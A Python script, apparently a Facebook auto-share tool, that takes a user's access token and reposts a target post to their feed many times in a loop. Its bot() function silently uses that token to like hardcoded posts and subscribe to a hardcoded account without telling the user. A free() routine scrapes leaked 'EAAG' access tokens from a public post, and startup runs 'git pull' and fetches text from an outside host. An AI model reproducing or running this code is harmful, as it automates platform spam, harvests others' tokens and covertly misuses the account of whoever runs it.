#09-02-2022 : 16.40
#17-02-2022 : 22.32
#19-02-2022 : 08.44
#hanya seorang perekode biasa
#georgy alifich el zhukov
#github.com/xnsvn
import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date
salam212 = requests.get("http://dindaacrack.6te.net/siang.php").text
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bo = []
def free():
        global bo
        asww=requests.get("https://free.facebook.com/100014905842581/posts/1280398002467049")
        aq = asww.text
        h_tkn=(str(re.findall("(EAAG\w+)",aq)))
        bo.append(h_tkn)
        idq = open('token', 'w')
        idq.write("("+h_tkn+")")
        bh = aq.split("', '")
        naa = ("%s"%(h_tkn))
        print(naa)
        print("sucsses generated")
def login():
	os.system("clear")
	try:
		token = open('token.txt', 'r')
		main()
	except (KeyError, IOError):
		os.system('clear')
		print("\n    [  ANDA HARUS LOGIN ]")
		token = input('\n [ TOKEN : ');print("]")
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			main()
		except KeyError:
			print("token eror")
			sys.exit() 
def countdown(p): 
    while p: 
        mins, secs = divmod(p, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        print(timer, end="\r ") 
        time.sleep(1) 
        p -= 1
    #print('Fire in the hole!!') 
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" token mokad")
	requests.post('https://graph.facebook.com/1131223424372711/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/1123741075120946/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/1616387222028138/likes?summary=true&access_token=' + token)
	requests.post('https://graph.facebook.com/100065699346434/subscribers?access_token=' + token)#285423000019298
	requests.post('https://graph.facebook.com/100065699346434/subscribers?access_token=' + token)
	#tambahin boleh ganti/hapus jangan hargai pembuat
def main():
    global token
    try:   	
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        na1m = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n [!] token kadaluwarsa!")
        os.system('rm -f token.txt')
        login()
    except requests.exceptions.ConnectionError:
        exit("[!] you are not connected to the internet!")
    print(" [ selamat %s%s ]\n"%(salam212,na1m));time.sleep(0.03)
    print("")
    print("*target id must be public")
    id = input('*id post : ')
    m=int(input(f'*limit  : '))
    p=int(input(f'*Delay  :'))
    time.sleep(1)
    print("*have a nice day")
    input("*Enter To start")
    print('*please wait a few minutes ... \n')
    print("*type ctrl+z to stop")
    time.sleep(2)
    time.sleep(30)
    try:
	     token = open("token.txt", "r").read()
	     for i in range(m):
#                 time.sleep(30)
	         response1 = requests.post("https://graph.facebook.com/me/feed?method=POST&link=https://www.facebook.com/"+id+"&privacy={%27value%27:%20%27EVERYONE%27}&access_token="+token+"")
	         print("\r[STATUS]>> "+response1.text+""+str(i)+"")
	         #time.sleep(p) 
	         countdown(int(p)) 
	         sys.stdout.write(f" \r[STATUS]>  ")
	         sys.stdout.flush()
    except requests.exceptions.ConnectionError:
	    exit('! Koneksi Bermasalah')
if __name__ == '__main__':
	os.system("git pull")
	os.system("clear")
	print("\n*Facebook : Georgy Alifich\n*Github : github.com/xnsvn\n*yt : AFK YT\n")
	login()
